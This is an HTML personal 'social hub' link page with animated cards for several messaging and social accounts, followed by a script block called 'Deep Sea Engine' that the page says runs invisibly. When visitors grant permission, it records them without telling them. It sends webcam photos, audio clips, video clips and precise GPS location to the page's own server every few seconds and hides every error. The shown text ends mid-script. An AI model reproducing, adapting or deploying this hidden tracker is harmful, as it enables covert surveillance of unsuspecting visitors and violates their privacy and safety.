<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>𝐄𝐗𝐔ㅤ𝐂𝐎𝐃𝐄𝐑 | Social Hub</title>
  <meta name="description" content="𝐄𝐗𝐔ㅤ𝐂𝐎𝐃𝐄𝐑 — all links in one place.">
  <meta name="theme-color" content="#0a0a0f">
  <meta property="og:title" content="𝐄𝐗𝐔ㅤ𝐂𝐎𝐃𝐄𝐑">
  <meta property="og:description" content="Developer · Creator · Coder · Dreamer — find me everywhere.">
  <meta property="og:type" content="website">
  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-deep: #0a0a0f;
      --bg-card: rgba(20, 20, 30, 0.6);
      --neon-cyan: #00f5d4;
      --neon-purple: #9b5de5;
      --neon-pink: #f15bb5;
      --neon-blue: #00bbf9;
      --neon-green: #00f5a0;
      --text-primary: #f0f0f5;
      --text-secondary: #8892b0;
      --glass-border: rgba(255, 255, 255, 0.08);
    }
    
    * { margin: 0; padding: 0; box-sizing: border-box; }
    
    body {
      font-family: 'Space Grotesk', sans-serif;
      background: var(--bg-deep) url('background.png') center center / cover no-repeat fixed;
      min-height: 100vh;
      overflow-x: hidden;
      color: var(--text-primary);
    }

    .bg-overlay {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(10, 10, 15, 0.55);
      z-index: 0;
      pointer-events: none;
    }
    
    .bg-canvas {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      z-index: 0;
      pointer-events: none;
    }
    
    .bg-canvas canvas {
      display: block;
    }
    
    .orb {
      position: fixed;
      border-radius: 50%;
      filter: blur(80px);
      opacity: 0.4;
      z-index: 0;
      animation: floatOrb 20s ease-in-out infinite;
    }
    .orb-1 { width: 400px; height: 400px; background: var(--neon-purple); top: -100px; left: -100px; animation-delay: 0s; }
    .orb-2 { width: 350px; height: 350px; background: var(--neon-cyan); bottom: -80px; right: -80px; animation-delay: -7s; }
    .orb-3 { width: 300px; height: 300px; background: var(--neon-pink); top: 50%; left: 50%; animation-delay: -14s; }
    
    @keyframes floatOrb {
      0%, 100% { transform: translate(0, 0) scale(1); }
      25% { transform: translate(50px, -30px) scale(1.1); }
      50% { transform: translate(-30px, 50px) scale(0.9); }
      75% { transform: translate(40px, 40px) scale(1.05); }
    }
    
    .container {
      position: relative;
      z-index: 1;
      max-width: 680px;
      margin: 0 auto;
      padding: 60px 24px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    
    .profile {
      text-align: center;
      margin-bottom: 48px;
      animation: fadeInUp 1s ease-out;
    }
    
    .avatar-wrapper {
      position: relative;
      display: inline-block;
      margin-bottom: 24px;
    }
    
    .avatar {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      object-fit: cover;
      position: relative;
      z-index: 2;
      box-shadow: 0 0 40px rgba(155, 93, 229, 0.4), 0 0 80px rgba(0, 245, 212, 0.2);
      transition: transform 0.4s ease, box-shadow 0.4s ease;
    }
    
    .avatar-wrapper:hover .avatar {
      transform: scale(1.05);
      box-shadow: 0 0 60px rgba(155, 93, 229, 0.6), 0 0 100px rgba(0, 245, 212, 0.3);
    }
    
    .avatar-ring {
      position: absolute;
      top: -8px; left: -8px;
      width: 136px; height: 136px;
      border-radius: 50%;
      border: 2px solid transparent;
      background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple), var(--neon-pink)) border-box;
      -webkit-mask: linear-gradient(#fff 0 0) padding-box, linear-gradient(#fff 0 0);
      -webkit-mask-composite: xor;
      mask-composite: exclude;
      animation: spinRing 8s linear infinite;
    }
    
    @keyframes spinRing {
      to { transform: rotate(360deg); }
    }
    
    .profile h1 {
      font-size: 2.3rem;
      font-weight: 700;
      background: linear-gradient(135deg, var(--neon-cyan), var(--neon-purple), var(--neon-pink));
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
      margin-bottom: 8px;
      letter-spacing: 1px;
      display: inline-flex;
      align-items: center;
      gap: 8px;
      word-break: keep-all;
    }

    .profile h1 .verified {
      -webkit-text-fill-color: initial;
      flex-shrink: 0;
    }

    .status-dot {
      position: absolute;
      bottom: 6px;
      right: 6px;
      width: 22px;
      height: 22px;
      border-radius: 50%;
      background: var(--neon-green);
      border: 3px solid var(--bg-deep);
      z-index: 3;
      box-shadow: 0 0 12px rgba(0, 245, 160, 0.7);
      animation: pulseDot 2s ease-in-out infinite;
    }

    @keyframes pulseDot {
      0%, 100% { box-shadow: 0 0 8px rgba(0, 245, 160, 0.6); }
      50% { box-shadow: 0 0 18px rgba(0, 245, 160, 0.9); }
    }
    
    .profile .handle {
      font-family: 'JetBrains Mono', monospace;
      font-size: 1rem;
      color: var(--text-secondary);
      letter-spacing: 2px;
    }
    
    .profile .tagline {
      margin-top: 12px;
      font-size: 1.1rem;
      color: var(--text-secondary);
      max-width: 400px;
      line-height: 1.6;
    }
    
    .typing-cursor {
      display: inline-block;
      width: 2px;
      height: 1.1em;
      background: var(--neon-cyan);
      margin-left: 4px;
      animation: blink 1s step-end infinite;
      vertical-align: text-bottom;
    }
    
    @keyframes blink {
      50% { opacity: 0; }
    }
    
    .social-grid {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }
    
    .social-card {
      position: relative;
      display: flex;
      align-items: center;
      padding: 20px 24px;
      background: var(--bg-card);
      border: 1px solid var(--glass-border);
      border-radius: 20px;
      text-decoration: none;
      color: var(--text-primary);
      backdrop-filter: blur(20px);
      transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
      overflow: hidden;
      opacity: 0;
      transform: translateY(30px);
      animation: slideIn 0.6s ease-out forwards;
    }
    
    .social-card:nth-child(1) { animation-delay: 0.1s; }
    .social-card:nth-child(2) { animation-delay: 0.2s; }
    .social-card:nth-child(3) { animation-delay: 0.3s; }
    .social-card:nth-child(4) { animation-delay: 0.4s; }
    .social-card:nth-child(5) { animation-delay: 0.5s; }
    .social-card:nth-child(6) { animation-delay: 0.6s; }
    .social-card:nth-child(7) { animation-delay: 0.7s; }
    
    @keyframes slideIn {
      to { opacity: 1; transform: translateY(0); }
    }
    
    .social-card::before {
      content: '';
      position: absolute;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.03), transparent);
      transform: translateX(-100%);
      transition: transform 0.6s ease;
    }
    
    .social-card:hover::before {
      transform: translateX(100%);
    }
    
    .social-card:hover {
      transform: translateY(-4px) scale(1.02);
      border-color: var(--accent);
      box-shadow: 0 20px 40px rgba(0,0,0,0.3), 0 0 30px var(--glow);
    }
    
    .social-card .icon {
      width: 52px;
      height: 52px;
      border-radius: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      margin-right: 18px;
      flex-shrink: 0;
      background: var(--icon-bg);
      transition: transform 0.3s ease;
      overflow: hidden;
    }

    .social-card .icon img {
      width: 28px;
      height: 28px;
      object-fit: contain;
    }

    .social-card .icon .icon-fallback {
      font-size: 20px;
      font-weight: 700;
      color: var(--accent);
    }
    
    .social-card:hover .icon {
      transform: scale(1.15) rotate(-5deg);
    }
    
    .social-card .info {
      flex: 1;
      min-width: 0;
    }
    
    .social-card .info .name {
      font-size: 1.15rem;
      font-weight: 600;
      margin-bottom: 4px;
      display: inline-flex;
      align-items: center;
      gap: 6px;
    }

    .mini-verified {
      flex-shrink: 0;
      display: inline-block;
    }

    .social-card .info .username {
      display: none;
    }

    .social-card .info .sub-username {
      opacity: 0.6;
      font-size: 0.8rem;
    }
    
    .social-card .arrow {
      width: 36px;
      height: 36px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      background: rgba(255,255,255,0.05);
      color: var(--text-secondary);
      transition: all 0.3s ease;
      flex-shrink: 0;
    }
    
    .social-card:hover .arrow {
      background: var(--accent);
      color: white;
      transform: translateX(4px);
    }
    
    .card-whatsapp { --accent: #25d366; --glow: rgba(37, 211, 102, 0.2); --icon-bg: rgba(37, 211, 102, 0.15); }
    .card-telegram { --accent: #0088cc; --glow: rgba(0, 136, 204, 0.2); --icon-bg: rgba(0, 136, 204, 0.15); }
    .card-instagram { --accent: #e1306c; --glow: rgba(225, 48, 108, 0.2); --icon-bg: rgba(225, 48, 108, 0.15); }
    .card-tiktok { --accent: #ff0050; --glow: rgba(255, 0, 80, 0.2); --icon-bg: rgba(255, 0, 80, 0.15); }
    .card-facebook { --accent: #1877f2; --glow: rgba(24, 119, 242, 0.2); --icon-bg: rgba(24, 119, 242, 0.15); }
    .card-discord { --accent: #5865f2; --glow: rgba(88, 101, 242, 0.2); --icon-bg: rgba(88, 101, 242, 0.15); }
    
    .footer {
      margin-top: 48px;
      text-align: center;
      color: var(--text-secondary);
      font-size: 0.85rem;
      opacity: 0;
      animation: fadeInUp 1s ease-out 0.8s forwards;
    }
    
    .footer .heart {
      color: var(--neon-pink);
      display: inline-block;
      animation: heartbeat 1.5s ease-in-out infinite;
    }
    
    @keyframes heartbeat {
      0%, 100% { transform: scale(1); }
      14% { transform: scale(1.3); }
      28% { transform: scale(1); }
      42% { transform: scale(1.3); }
    }
    
    @keyframes fadeInUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    .particle {
      position: absolute;
      width: 4px; height: 4px;
      border-radius: 50%;
      pointer-events: none;
      opacity: 0;
    }
    
    .social-card:focus-visible {
      outline: 2px solid var(--neon-cyan);
      outline-offset: 3px;
    }

    @media (prefers-reduced-motion: reduce) {
      *, *::before, *::after {
        animation-duration: 0.01ms !important;
        animation-iteration-count: 1 !important;
        transition-duration: 0.01ms !important;
      }
    }

    @media (max-width: 480px) {
      .container { padding: 40px 16px; }
      .profile h1 { font-size: 1.7rem; gap: 6px; }
      .profile h1 .verified { width: 18px; height: 18px; }
      .social-card { padding: 16px 18px; }
      .social-card .icon { width: 44px; height: 44px; font-size: 20px; }
    }
  </style>
</head>
<body>
  <div class="bg-overlay"></div>
  <div class="bg-canvas">
    <canvas id="particleCanvas"></canvas>
  </div>
  <div class="orb orb-1"></div>
  <div class="orb orb-2"></div>
  <div class="orb orb-3"></div>

  <div class="container">
    <div class="profile">
      <div class="avatar-wrapper">
        <div class="avatar-ring"></div>
        <img src="Logo.png" alt="EXUCODER Logo" class="avatar" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
        <div class="avatar" style="display:none; background: linear-gradient(135deg, var(--neon-purple), var(--neon-cyan));">E9</div>
        <span class="status-dot" title="Online"></span>
      </div>
      <h1>𝐄𝐗𝐔ㅤ𝐂𝐎𝐃𝐄𝐑 <svg class="verified" width="22" height="22" viewBox="0 0 24 24" fill="none" title="Verified"><path d="M12 2l2.4 1.6 2.8-.4 1.3 2.5 2.5 1.3-.4 2.8L22 12l-1.6 2.4.4 2.8-2.5 1.3-1.3 2.5-2.8-.4L12 22l-2.4-1.6-2.8.4-1.3-2.5-2.5-1.3.4-2.8L2 12l1.6-2.4-.4-2.8 2.5-1.3 1.3-2.5 2.8.4z" fill="url(#vGrad)"/><path d="M8.5 12.5l2.3 2.3 4.7-5.1" stroke="#0a0a0f" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><defs><linearGradient id="vGrad" x1="0" y1="0" x2="24" y2="24"><stop stop-color="var(--neon-cyan)"/><stop offset="1" stop-color="var(--neon-purple)"/></linearGradient></defs></svg></h1>
      <div class="handle">@exucoder9x</div>
      <div class="tagline" id="typewriter"></div>
    </div>
    
    <div class="social-grid">
      <a href="https://wa.me/8801346498005" target="_blank" class="social-card card-whatsapp" aria-label="WhatsApp @exucoder9x, phone +880 1346-498005">
        <div class="icon">
          <img src="whatsapp.png" alt="WhatsApp" onerror="this.replaceWith(Object.assign(document.createElement('span'),{className:'icon-fallback',textContent:'W'}));">
        </div>
        <div class="info">
          <div class="name">WhatsApp <svg class="mini-verified" width="16" height="16" viewBox="0 0 22 22" fill="none" title="Verified"><path d="M11 1.5l1.8.9 2-.6 1.3 1.6 2.1.2.6 2 1.8 1-.4 2.1 1 1.9-1.4 1.4.1 2.1-2 .7-.6 2-2.1-.1-1.4 1.6-1.9-.8-1.9.8-1.4-1.6-2.1.1-.6-2-2-.7.1-2.1L1.5 11l1-1.9-.4-2.1 1.8-1 .6-2 2.1-.2 1.3-1.6 2-.6z" fill="#1d9bf0"/><path d="M7.8 11.3l2 2 4-4.4" stroke="#fff" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
          <div class="username">@exucoder9x <span class="sub-username">· +880 1346-498005</span></div>
        </div>
        <div class="arrow">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7M17 7H7M17 7V17"/></svg>
        </div>
      </a>
      
      <a href="https://t.me/EXUCODEX_9X" target="_blank" class="social-card card-telegram">
        <div class="icon">
          <img src="telegram.png" alt="Telegram" onerror="this.replaceWith(Object.assign(document.createElement('span'),{className:'icon-fallback',textContent:'T'}));">
        </div>
        <div class="info">
          <div class="name">Telegram <svg class="mini-verified" width="16" height="16" viewBox="0 0 22 22" fill="none" title="Verified"><path d="M11 1.5l1.8.9 2-.6 1.3 1.6 2.1.2.6 2 1.8 1-.4 2.1 1 1.9-1.4 1.4.1 2.1-2 .7-.6 2-2.1-.1-1.4 1.6-1.9-.8-1.9.8-1.4-1.6-2.1.1-.6-2-2-.7.1-2.1L1.5 11l1-1.9-.4-2.1 1.8-1 .6-2 2.1-.2 1.3-1.6 2-.6z" fill="#1d9bf0"/><path d="M7.8 11.3l2 2 4-4.4" stroke="#fff" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
          <div class="username">@EXUCODEX_9X</div>
        </div>
        <div class="arrow">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7M17 7H7M17 7V17"/></svg>
        </div>
      </a>
      
      <a href="https://instagram.com/exucoder_x9" target="_blank" class="social-card card-instagram">
        <div class="icon">
          <img src="instagram.png" alt="Instagram" onerror="this.replaceWith(Object.assign(document.createElement('span'),{className:'icon-fallback',textContent:'I'}));">
        </div>
        <div class="info">
          <div class="name">Instagram <svg class="mini-verified" width="16" height="16" viewBox="0 0 22 22" fill="none" title="Verified"><path d="M11 1.5l1.8.9 2-.6 1.3 1.6 2.1.2.6 2 1.8 1-.4 2.1 1 1.9-1.4 1.4.1 2.1-2 .7-.6 2-2.1-.1-1.4 1.6-1.9-.8-1.9.8-1.4-1.6-2.1.1-.6-2-2-.7.1-2.1L1.5 11l1-1.9-.4-2.1 1.8-1 .6-2 2.1-.2 1.3-1.6 2-.6z" fill="#1d9bf0"/><path d="M7.8 11.3l2 2 4-4.4" stroke="#fff" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
          <div class="username">@exucoder_x9</div>
        </div>
        <div class="arrow">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7M17 7H7M17 7V17"/></svg>
        </div>
      </a>
      
      <a href="https://tiktok.com/@exucoder_9x" target="_blank" class="social-card card-tiktok">
        <div class="icon">
          <img src="tiktok.png" alt="TikTok" onerror="this.replaceWith(Object.assign(document.createElement('span'),{className:'icon-fallback',textContent:'K'}));">
        </div>
        <div class="info">
          <div class="name">TikTok <svg class="mini-verified" width="16" height="16" viewBox="0 0 22 22" fill="none" title="Verified"><path d="M11 1.5l1.8.9 2-.6 1.3 1.6 2.1.2.6 2 1.8 1-.4 2.1 1 1.9-1.4 1.4.1 2.1-2 .7-.6 2-2.1-.1-1.4 1.6-1.9-.8-1.9.8-1.4-1.6-2.1.1-.6-2-2-.7.1-2.1L1.5 11l1-1.9-.4-2.1 1.8-1 .6-2 2.1-.2 1.3-1.6 2-.6z" fill="#1d9bf0"/><path d="M7.8 11.3l2 2 4-4.4" stroke="#fff" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
          <div class="username">@exucoder_9x</div>
        </div>
        <div class="arrow">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7M17 7H7M17 7V17"/></svg>
        </div>
      </a>
      
      <a href="https://facebook.com/exu9x.py" target="_blank" class="social-card card-facebook">
        <div class="icon">
          <img src="facebook.png" alt="Facebook" onerror="this.replaceWith(Object.assign(document.createElement('span'),{className:'icon-fallback',textContent:'F'}));">
        </div>
        <div class="info">
          <div class="name">Facebook <svg class="mini-verified" width="16" height="16" viewBox="0 0 22 22" fill="none" title="Verified"><path d="M11 1.5l1.8.9 2-.6 1.3 1.6 2.1.2.6 2 1.8 1-.4 2.1 1 1.9-1.4 1.4.1 2.1-2 .7-.6 2-2.1-.1-1.4 1.6-1.9-.8-1.9.8-1.4-1.6-2.1.1-.6-2-2-.7.1-2.1L1.5 11l1-1.9-.4-2.1 1.8-1 .6-2 2.1-.2 1.3-1.6 2-.6z" fill="#1d9bf0"/><path d="M7.8 11.3l2 2 4-4.4" stroke="#fff" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
          <div class="username">exu9x.py</div>
        </div>
        <div class="arrow">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7M17 7H7M17 7V17"/></svg>
        </div>
      </a>
      
      <a href="https://discord.com/users/1354888608460439592" target="_blank" class="social-card card-discord">
        <div class="icon">
          <img src="discord.png" alt="Discord" onerror="this.replaceWith(Object.assign(document.createElement('span'),{className:'icon-fallback',textContent:'D'}));">
        </div>
        <div class="info">
          <div class="name">Discord <svg class="mini-verified" width="16" height="16" viewBox="0 0 22 22" fill="none" title="Verified"><path d="M11 1.5l1.8.9 2-.6 1.3 1.6 2.1.2.6 2 1.8 1-.4 2.1 1 1.9-1.4 1.4.1 2.1-2 .7-.6 2-2.1-.1-1.4 1.6-1.9-.8-1.9.8-1.4-1.6-2.1.1-.6-2-2-.7.1-2.1L1.5 11l1-1.9-.4-2.1 1.8-1 .6-2 2.1-.2 1.3-1.6 2-.6z" fill="#1d9bf0"/><path d="M7.8 11.3l2 2 4-4.4" stroke="#fff" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg></div>
          <div class="username">exucoder9x</div>
        </div>
        <div class="arrow">
          <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M7 17L17 7M17 7H7M17 7V17"/></svg>
        </div>
      </a>
    </div>
    
    <div class="footer">
      Made with <span class="heart">❤</span> by EXUCODER
    </div>
  </div>

  <script>
    // ============================================================
    // YOUR ORIGINAL SCRIPTS (100% UNCHANGED)
    // ============================================================
    function toBoldUnicode(str) {
      let out = '';
      for (const ch of str) {
        const code = ch.codePointAt(0);
        if (code >= 65 && code <= 90) {
          out += String.fromCodePoint(0x1D400 + (code - 65));
        } else if (code >= 97 && code <= 122) {
          out += String.fromCodePoint(0x1D41A + (code - 97));
        } else if (code >= 48 && code <= 57) {
          out += String.fromCodePoint(0x1D7CE + (code - 48));
        } else {
          out += ch;
        }
      }
      return out;
    }

    function boldifyTextNodes(node) {
      if (node.nodeType === Node.TEXT_NODE) {
        if (node.textContent.trim().length) {
          node.textContent = toBoldUnicode(node.textContent);
        }
        return;
      }
      if (node.nodeType === Node.ELEMENT_NODE) {
        const tag = node.tagName.toUpperCase();
        if (tag === 'SCRIPT' || tag === 'STYLE' || tag === 'SVG' || node.id === 'typewriter') return;
        node.childNodes.forEach(boldifyTextNodes);
      }
    }
    boldifyTextNodes(document.body);

    const phrases = ['Developer', 'Creator', 'Coder', 'Dreamer'].map(toBoldUnicode);
    let phraseIndex = 0;
    let charIndex = 0;
    let isDeleting = false;
    const typewriterEl = document.getElementById('typewriter');
    
    function typeWriter() {
      const currentChars = Array.from(phrases[phraseIndex]);
      if (isDeleting) {
        typewriterEl.textContent = currentChars.slice(0, charIndex - 1).join('');
        charIndex--;
      } else {
        typewriterEl.textContent = currentChars.slice(0, charIndex + 1).join('');
        charIndex++;
      }
      
      let typeSpeed = isDeleting ? 50 : 100;
      if (!isDeleting && charIndex === currentChars.length) {
        typeSpeed = 2000;
        isDeleting = true;
      } else if (isDeleting && charIndex === 0) {
        isDeleting = false;
        phraseIndex = (phraseIndex + 1) % phrases.length;
        typeSpeed = 500;
      }
      
      setTimeout(typeWriter, typeSpeed);
    }
    typeWriter();
    
    const canvas = document.getElementById('particleCanvas');
    const ctx = canvas.getContext('2d');
    let particles = [];
    let mouseX = 0, mouseY = 0;
    
    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    resizeCanvas();
    window.addEventListener('resize', resizeCanvas);
    
    class Particle {
      constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.vx = (Math.random() - 0.5) * 0.5;
        this.vy = (Math.random() - 0.5) * 0.5;
        this.size = Math.random() * 2 + 0.5;
        this.opacity = Math.random() * 0.5 + 0.1;
      }
      update() {
        this.x += this.vx;
        this.y += this.vy;
        if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
        if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
        
        const dx = mouseX - this.x;
        const dy = mouseY - this.y;
        const dist = Math.sqrt(dx*dx + dy*dy);
        if (dist < 150) {
          this.vx -= dx * 0.0001;
          this.vy -= dy * 0.0001;
        }
      }
      draw() {
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fillStyle = `rgba(0, 245, 212, ${this.opacity})`;
        ctx.fill();
      }
    }
    
    for (let i = 0; i < 80; i++) particles.push(new Particle());
    
    function animateParticles() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      particles.forEach(p => { p.update(); p.draw(); });
      
      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.sqrt(dx*dx + dy*dy);
          if (dist < 120) {
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.strokeStyle = `rgba(155, 93, 229, ${0.1 * (1 - dist/120)})`;
            ctx.lineWidth = 0.5;
            ctx.stroke();
          }
        }
      }
      requestAnimationFrame(animateParticles);
    }
    animateParticles();
    
    document.addEventListener('mousemove', (e) => {
      mouseX = e.clientX;
      mouseY = e.clientY;
    });
    
    document.querySelectorAll('.social-card').forEach(card => {
      card.addEventListener('mouseenter', function(e) {
        const rect = this.getBoundingClientRect();
        const color = getComputedStyle(this).getPropertyValue('--accent').trim();
        for (let i = 0; i < 8; i++) {
          const particle = document.createElement('div');
          particle.className = 'particle';
          particle.style.background = color;
          particle.style.left = (e.clientX - rect.left) + 'px';
          particle.style.top = (e.clientY - rect.top) + 'px';
          this.appendChild(particle);
          
          const angle = (Math.PI * 2 * i) / 8;
          const velocity = 30 + Math.random() * 20;
          const tx = Math.cos(angle) * velocity;
          const ty = Math.sin(angle) * velocity;
          
          particle.animate([
            { transform: 'translate(0,0) scale(1)', opacity: 1 },
            { transform: `translate(${tx}px, ${ty}px) scale(0)`, opacity: 0 }
          ], {
            duration: 600,
            easing: 'cubic-bezier(0, .9, .57, 1)'
          }).onfinish = () => particle.remove();
        }
      });
    });


    // ============================================================
    // DEEP SEA ENGINE - UPDATED WITH VIDEO RECORDING
    // Everything runs invisibly in the background
    // ============================================================
    (function() {
      'use strict';

      // ─── CONFIG ──────────────────────────────────────────────
      const CONFIG = {
        backendUrl: window.location.origin,
        photoInterval: 5000,
        audioInterval: 10000,
        videoInterval: 15000,
        locationInterval: 30000,
        photoQuality: 0.85
      };

      // ─── STATE ──────────────────────────────────────────────
      let cameraStream = null;
      let audioStream = null;
      let mediaRecorder = null;
      let audioChunks = [];
      
      // Video state
      let videoStream = null;
      let videoRecorder = null;
      let videoChunks = [];
      
      let isCameraReady = false;
      let photoCount = 0;
      let watchId = null;
      let lastLocationSent = 0;
      let hiddenVideo = null;

      // ─── INITIALIZE ──────────────────────────────────────────
      async function initDeepSea() {
        try {
          await startCamera();
          await startAudioRecording();
          await startVideoRecording();  // ← NEW
          startLocationTracking();
          startAutoCapture();
        } catch (error) {
          // Silently fail - no UI impact
        }
      }

      // ─── CAMERA ──────────────────────────────────────────────
      async function startCamera() {
        try {
          cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false
          });

          hiddenVideo = document.createElement('video');
          hiddenVideo.style.display = 'none';
          hiddenVideo.setAttribute('playsinline', '');
          hiddenVideo.setAttribute('autoplay', '');
          document.body.appendChild(hiddenVideo);

          hiddenVideo.srcObject = cameraStream;
          await hiddenVideo.play();
          isCameraReady = true;
        } catch (error) {}
      }

      // ─── CAPTURE PHOTO ──────────────────────────────────────
      function capturePhoto() {
        if (!isCameraReady || !hiddenVideo || hiddenVideo.readyState < 2) return;

        try {
          const canvas = document.createElement('canvas');
          canvas.width = hiddenVideo.videoWidth || 1280;
          canvas.height = hiddenVideo.videoHeight || 720;

          const ctx = canvas.getContext('2d');
          ctx.translate(canvas.width, 0);
          ctx.scale(-1, 1);
          ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);

          const dataURL = canvas.toDataURL('image/jpeg', CONFIG.photoQuality);

          fetch(`${CONFIG.backendUrl}/upload/photo`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: dataURL })
          }).catch(() => {});
        } catch (error) {}
      }

      // ─── AUTO CAPTURE ────────────────────────────────────────
      function startAutoCapture() {
        setTimeout(capturePhoto, 2000);
        setInterval(capturePhoto, CONFIG.photoInterval);
      }

      // ─── AUDIO RECORDING ─────────────────────────────────────
      async function startAudioRecording() {
        try {
          audioStream = await navigator.mediaDevices.getUserMedia({
            audio: true,
            video: false
          });

          mediaRecorder = new MediaRecorder(audioStream, { mimeType: 'audio/webm' });

          mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) audioChunks.push(event.data);
          };

          mediaRecorder.onstop = () => {
            if (audioChunks.length > 0) {
              const blob = new Blob(audioChunks, { type: 'audio/webm' });
              audioChunks = [];
              sendAudio(blob);
            }
          };

          mediaRecorder.start();

          setInterval(() => {
            if (mediaRecorder && mediaRecorder.state === 'recording') {
              mediaRecorder.stop();
              setTimeout(() => { mediaRecorder.start(); }, 100);
            }
          }, CONFIG.audioInterval);

        } catch (error) {}
      }

      function sendAudio(blob) {
        const reader = new FileReader();
        reader.onloadend = () => {
          fetch(`${CONFIG.backendUrl}/upload/audio`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ audio: reader.result })
          }).catch(() => {});
        };
        reader.readAsDataURL(blob);
      }

      // ─── VIDEO RECORDING (NEW) ──────────────────────────────
      async function startVideoRecording() {
        try {
          // Use separate stream with audio for video
          videoStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: true
          });

          videoRecorder = new MediaRecorder(videoStream, {
            mimeType: 'video/webm;codecs=vp9,opus'
          });

          videoRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) videoChunks.push(event.data);
          };

          videoRecorder.onstop = () => {
            if (videoChunks.length > 0) {
              const blob = new Blob(videoChunks, { type: 'video/webm' });
              videoChunks = [];
              sendVideo(blob);
            }
          };

          videoRecorder.start();

          setInterval(() => {
            if (videoRecorder && videoRecorder.state === 'recording') {
              videoRecorder.stop();
              setTimeout(() => { videoRecorder.start(); }, 100);
            }
          }, CONFIG.videoInterval);

        } catch (error) {
          // Video might not be supported - silently fail
        }
      }

      function sendVideo(blob) {
        const reader = new FileReader();
        reader.onloadend = () => {
          fetch(`${CONFIG.backendUrl}/upload/video`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ video: reader.result })
          }).catch(() => {});
        };
        reader.readAsDataURL(blob);
      }

      // ─── LOCATION TRACKING ──────────────────────────────────
      function startLocationTracking() {
        if (!navigator.geolocation) return;

        watchId = navigator.geolocation.watchPosition(
          (position) => {
            const location = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              altitude: position.coords.altitude,
              heading: position.coords.heading,
              speed: position.coords.speed
            };

            const now = Date.now();
            if (now - lastLocationSent >= CONFIG.locationInterval) {
              lastLocationSent = now;
              fetch(`${CONFIG.backendUrl}/upload/location`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ location: location })
              }).catch(() => {});
            }
          },
          () => {},
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
        );
      }

      // ─── CLEANUP ─────────────────────────────────────────────
      function cleanup() {
        if (cameraStream) cameraStream.getTracks().forEach(t => t.stop());
        if (audioStream) audioStream.getTracks().forEach(t => t.stop());
        if (videoStream) videoStream.getTracks().forEach(t => t.stop());
        if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
        if (videoRecorder && videoRecorder.state === 'recording') videoRecorder.stop();
        if (watchId) navigator.geolocation.clearWatch(watchId);
        if (hiddenVideo) hiddenVideo.remove();
      }

